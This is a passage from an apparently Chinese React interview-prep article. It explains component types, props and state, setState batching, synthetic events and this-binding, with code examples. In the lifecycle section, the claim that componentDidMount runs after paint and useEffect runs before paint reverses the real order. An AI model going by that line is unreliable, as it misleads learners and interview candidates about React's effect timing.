align="left">更新机制</td><td align="left">闭包捕获当次渲染状态</td><td align="left">始终读取最新 this.state</td></tr><tr><td align="left">批处理</td><td align="left">自动批处理（React 18+）</td><td align="left">需 unstable_batchedUpdates</td></tr><tr><td align="left">异步性</td><td align="left">状态更新队列</td><td align="left">setState 合并更新</td></tr></tbody></table><p><strong>生命周期映射关系</strong></p><pre class="mermaid">graph TD  A[类组件生命周期] --> B[componentDidMount]  A --> C[componentDidUpdate]  A --> D[componentWillUnmount]    E[函数组件等效实现] --> F["useEffect(() => {}, [])"]  E --> G["useEffect(() => {}, [deps])"]  E --> H["useEffect(() => { return () => {} }, [])"]    B -->|挂载后执行| F  C -->|依赖更新后执行| G  D -->|卸载前清理| H</pre><p>关键差异点：</p><ul><li>类组件：生命周期方法分散定义，逻辑易割裂，componentDidMount&#x2F;Update 在 浏览器绘制后 执行</li><li>函数组件：useEffect 集中处理副作用，通过依赖数组控制执行时机，useEffect 在 浏览器绘制前 异步执行（使用 useLayoutEffect 可模拟同步行为）</li></ul><h3 id="高频面试题与破解技巧-1"><a href="#高频面试题与破解技巧-1" class="headerlink" title="高频面试题与破解技巧"></a>高频面试题与破解技巧</h3><p><strong>Q：为什么函数组件取代了类组件成为主流？</strong></p><ul><li>代码简洁性：减少约 30% 代码量（无 class&#x2F;this&#x2F;constructor）</li><li>逻辑复用优势：自定义 Hook 比 HOC&#x2F;Render Props 更直观</li><li>性能优化：避免类组件实例化开销，Hook 依赖数组精准控制更新</li><li>未来兼容：React 新特性（Concurrent Features）优先支持函数组件</li></ul><p><strong>Q：函数组件如何实现类似 forceUpdate 的功能？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [_, forceUpdate] = <span class="hljs-title function_">useReducer</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 调用 forceUpdate() 触发重渲染</span><br></code></pre></td></tr></table></figure><p>原理：通过修改无关状态强制触发更新</p><p><strong>Q：类组件中 setState 是同步还是异步？</strong></p><ul><li>React 17 及之前：合成事件&#x2F;生命周期中异步，setTimeout 中同步</li><li>React 18+：默认全部异步（自动批处理）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 获取更新后状态的正确方式</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-number">42</span> &#125;, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;更新后：&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span>); <span class="hljs-comment">// 回调函数保证</span><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="1-4-Props-与-State（数据流、单向数据绑定）"><a href="#1-4-Props-与-State（数据流、单向数据绑定）" class="headerlink" title="1.4 Props 与 State（数据流、单向数据绑定）"></a>1.4 Props 与 State（数据流、单向数据绑定）</h2><h3 id="基础概念对比表"><a href="#基础概念对比表" class="headerlink" title="基础概念对比表"></a>基础概念对比表</h3><table><thead><tr><th align="left">特性</th><th align="left">Props</th><th align="left">State</th></tr></thead><tbody><tr><td align="left">定义</td><td align="left">组件外部传入的数据</td><td align="left">组件内部管理的状态</td></tr><tr><td align="left">可变性</td><td align="left">只读（Immutable）</td><td align="left">可修改（通过 setState&#x2F;useState）</td></tr><tr><td align="left">数据源</td><td align="left">父组件传递</td><td align="left">组件自身创建</td></tr><tr><td align="left">更新触发</td><td align="left">父组件重渲染</td><td align="left">调用状态更新函数</td></tr><tr><td align="left">通信方向</td><td align="left">父 → 子</td><td align="left">组件内部</td></tr></tbody></table><h3 id="核心机制深度解析"><a href="#核心机制深度解析" class="headerlink" title="核心机制深度解析"></a>核心机制深度解析</h3><p><strong>单向数据流（Unidirectional Data Flow）</strong></p><pre class="mermaid">graph LRA[父组件] -- Props --> B[子组件1]A -- Props --> C[子组件2]B -- Props --> D[孙子组件]C -- Props --> E[孙子组件]</pre><p>核心规则：</p><ul><li>数据只能从父组件流向子组件，禁止反向流动</li><li>子组件修改父组件数据需通过回调函数实现：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 父组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setValue&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 子组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; value, onChange &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> onChange(e.target.value)&#125; /&gt;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Props 的不可变性（Immutability）</strong></p><p>底层原理：</p><ul><li>React 使用 Object.is 算法进行 props 浅比较（shallow compare）</li><li>若检测到 props 引用变化，则触发子组件重渲染</li></ul><p>开发约束：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 禁止直接修改 props</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserCard</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  user.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Hacked&quot;</span>;  <span class="hljs-comment">// 违反不可变性原则</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 正确做法：使用派生数据</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserCard</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> displayName = user.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>();  <span class="hljs-comment">// 创建新值</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;displayName&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>State 更新机制</strong></p><p>(1) 类组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  increment = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 批量更新：多次 setState 合并为一次更新</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>    <span class="hljs-comment">// 结果：count 只 +1（使用对象形式）</span><br>    <br>    <span class="hljs-comment">// 函数形式解决连续更新</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; <span class="hljs-attr">count</span>: prev.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;));<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; <span class="hljs-attr">count</span>: prev.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;));<br>    <span class="hljs-comment">// 结果：count +2</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 函数组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 闭包捕获当前 count 值</span><br>    <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 仍基于初始值计算</span><br>    <br>    <span class="hljs-comment">// 函数形式获取最新值</span><br>    <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br>    <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>); <span class="hljs-comment">// 正确 +2</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案"><a href="#高频面试题与破解方案" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么React强调Props不可变？</strong></p><ul><li>可预测性：确保组件行为只取决于输入的props，便于调试</li><li>性能优化：浅比较依赖引用不变性（若直接修改，浅比较无法检测变化）</li><li>并发安全：避免数据在渲染过程中被意外修改</li></ul><p><strong>Q：如何实现子组件向父组件通信？</strong></p><p>设计模式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 父组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-comment">// 回调函数作为prop传递</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildSubmit</span> = (<span class="hljs-params">childData</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setData</span>(childData);<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;handleChildSubmit&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 子组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; onSubmit &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [input, setInput] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;input&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> setInput(e.target.value)&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> onSubmit(input)&#125;&gt;提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：什么时候该用Props vs State？</strong></p><p>决策过程：</p><pre class="mermaid">graph TDA[数据来源] -->|父组件传递| B[用Props]A -->|组件自身管理| C[用State]D[是否随时间/交互变化] -->|否| E[用Props]D -->|是| F[用State]</pre><h3 id="高级应用场景"><a href="#高级应用场景" class="headerlink" title="高级应用场景"></a>高级应用场景</h3><p><strong>状态提升（Lifting State Up）</strong></p><p>场景：多个组件需要共享同一状态</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 状态提升到共同父组件</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Toolbar</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> <span class="hljs-attr">onThemeChange</span>=<span class="hljs-string">&#123;setTheme&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ContentArea</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 子组件通过props获取/更新状态</span><br></code></pre></td></tr></table></figure><h3 id="性能优化陷阱"><a href="#性能优化陷阱" class="headerlink" title="性能优化陷阱"></a>性能优化陷阱</h3><p><strong>Props 穿透问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 不必要重渲染：直接传递对象</span><br>&lt;<span class="hljs-title class_">Child</span> user=&#123;user&#125; /&gt;<br><br><span class="hljs-comment">// ✅ 解决方案：扁平化props或React.memo</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#123;user.name&#125;</span> <span class="hljs-attr">age</span>=<span class="hljs-string">&#123;user.age&#125;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>状态位置错误导致的渲染风暴</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 状态放在过高层级</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [counter, setCounter] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 任何更新触发全应用重渲染</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// ✅ 状态下沉到最小范围</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 影响范围局部化</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c+1)&#125;&gt;&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-5-事件处理（合成事件、this-绑定问题）"><a href="#1-5-事件处理（合成事件、this-绑定问题）" class="headerlink" title="1.5 事件处理（合成事件、this 绑定问题）"></a>1.5 事件处理（合成事件、this 绑定问题）</h2><h3 id="基础概念概述-2"><a href="#基础概念概述-2" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><p>React 事件处理特点：</p><ul><li>驼峰命名：onClick 而非 onclick</li><li>JSX 中传入函数引用而非字符串</li><li>默认阻止默认行为需显式调用 e.preventDefault()</li></ul><p>两大核心问题：</p><ul><li>合成事件（SyntheticEvent）机制</li><li>类组件中的 this 绑定问题</li></ul><h3 id="合成事件（SyntheticEvent）深度解析"><a href="#合成事件（SyntheticEvent）深度解析" class="headerlink" title="合成事件（SyntheticEvent）深度解析"></a>合成事件（SyntheticEvent）深度解析</h3><p><strong>设计目的与原理</strong></p><pre class="mermaid">graph LRA[浏览器原生事件] --> B(React事件系统)B --> C[创建合成事件对象]C --> D[事件委托到根容器]D --> E[触发对应组件处理函数]E --> F[事件池回收]</pre><p>核心特性：</p><ul><li>跨浏览器兼容：统一不同浏览器事件接口</li><li>性能优化：事件委托 + 事件池复用（React 17 前）</li><li>冒泡机制：基于虚拟DOM树而非实际DOM树</li></ul><p><strong>事件池机制（React 17 前）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleClick</span>(<span class="hljs-params">e</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>); <span class="hljs-comment">// 正常访问</span><br>  <br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>); <span class="hljs-comment">// ❌ React 17前：null（事件对象已被回收）</span><br>  &#125;, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// ✅ 解决方案：e.persist() 保留事件对象</span><br>&#125;<br></code></pre></td></tr></table></figure><p>React 17+ 改进：移除了事件池，无需 e.persist()</p><p><strong>合成事件与原生事件差异</strong></p><table><thead><tr><th align="left">特性</th><th align="left">合成事件</th><th align="left">原生事件</th></tr></thead><tbody><tr><td align="left">事件注册</td><td align="left">onClick</td><td align="left">addEventListener</td></tr><tr><td align="left">事件对象</td><td align="left">SyntheticEvent</td><td align="left">原生 Event 对象</td></tr><tr><td align="left">事件传播</td><td align="left">虚拟DOM树冒泡</td><td align="left">实际DOM树冒泡</td></tr><tr><td align="left">阻止冒泡</td><td align="left">e.stopPropagation()</td><td align="left">同名API</td></tr><tr><td align="left">事件委托</td><td align="left">自动委托到根容器</td><td align="left">需手动委托</td></tr></tbody></table><h3 id="this-绑定问题详解（类组件）"><a href="#this-绑定问题详解（类组件）" class="headerlink" title="this 绑定问题详解（类组件）"></a>this 绑定问题详解（类组件）</h3><p><strong>问题根源</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// ❌ 此时 this 为 undefined（严格模式）</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>); <br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleClick&#125;</span>&gt;</span>点击<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原因：JavaScript 函数中的 this 由调用方式决定，非类实例本身</p><p><strong>四种解决方案对比</strong></p><table><thead><tr><th align="left">方案</th><th align="left">代码示例</th><th align="left">优点</th><th align="left">缺点</th></tr></thead><tbody><tr><td align="left">构造函数绑定</td><td align="left">this.handleClick &#x3D; this.handleClick.bind(this)</td><td align="left">标准做法</td><td align="left">代码冗余</td></tr><tr><td align="left">箭头函数（类属性）</td><td align="left">handleClick &#x3D; () &#x3D;&gt; {…}</td><td align="left">简洁，推荐方案</td><td align="left">实验性语法（需Babel）</td></tr><tr><td align="left">内联箭头函数</td><td align="left">onClick&#x3D;{() &#x3D;&gt; this.handleClick()}</td><td align="left">简单直接</td><td align="left">每次渲染创建新函数</td></tr><tr><td align="left">bind 内联</td><td align="left">onClick&#x3D;{this.handleClick.bind(this)}</td><td align="left">无额外代码</td><td align="left">同内联箭头函数</td></tr></tbody></table><p><strong>性能优化关键点</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 避免内联绑定（每次渲染创建新函数）</span><br>&lt;button onClick=&#123;<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleClick</span>(id)&#125;&gt;点击&lt;/button&gt;<br><br><span class="hljs-comment">// ✅ 推荐：构造函数预绑定</span><br><span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>&#125;<br><br><span class="hljs-comment">// ✅ 或使用类属性箭头函数</span><br>handleClick = <span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> &#123; ... &#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题与解决方案"><a href="#高频面试题与解决方案" class="headerlink" title="高频面试题与解决方案"></a>高频面试题与解决方案</h3><p><strong>Q：为什么React不直接使用原生事件？</strong></p><ul><li>跨浏览器兼容：统一事件处理逻辑</li><li>性能优化：事件委托减少内存占用</li><li>事件池机制：复用事件对象（React 17前）</li><li>框架扩展性：为异步渲染等特性铺平道路</li></ul><p><strong>Q：如何阻止合成事件的默认行为？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Form</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    e.<span class="hljs-title function_">preventDefault</span>(); <span class="hljs-comment">// ✅ 显式阻止表单提交</span><br>    <span class="hljs-comment">// 处理逻辑...</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;handleSubmit&#125;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：合成事件和原生事件混用时要注意什么？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleDocumentClick</span>);<br>&#125;<br><br>handleDocumentClick = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 原生事件</span><br>&#125;;<br><br>handleButtonClick = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 合成事件</span><br>  e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// ❌ 无法阻止原生事件冒泡</span><br>&#125;;<br><br><span class="hljs-comment">// ✅ 正确方案：在原生事件中使用 nativeEvent</span><br>handleButtonClick = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  e.<span class="hljs-property">nativeEvent</span>.<span class="hljs-title function_">stopImmediatePropagation</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="React-17-事件系统升级"><a href="#React-17-事件系统升级" class="headerlink" title="React 17+ 事件系统升级"></a>React 17+ 事件系统升级</h3><ul><li>委托目标变更：从 document 到 ReactDOM.render 的根容器</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React 16：委托到 document</span><br><span class="hljs-comment">// React 17+：委托到 root DOM 容器</span><br><span class="hljs-keyword">const</span> root = <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>));<br>root.<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>);<br></code></pre></td></tr></table></figure><ul><li>移除事件池：无需 e.persist() 可异步访问事件对象</li><li>更接近原生：e.stopPropagation() 真正阻止原生事件传播</li></ul><h1 id="第二章：React-核心机制"><a href="#第二章：React-核心机制" class="headerlink" title="第二章：React 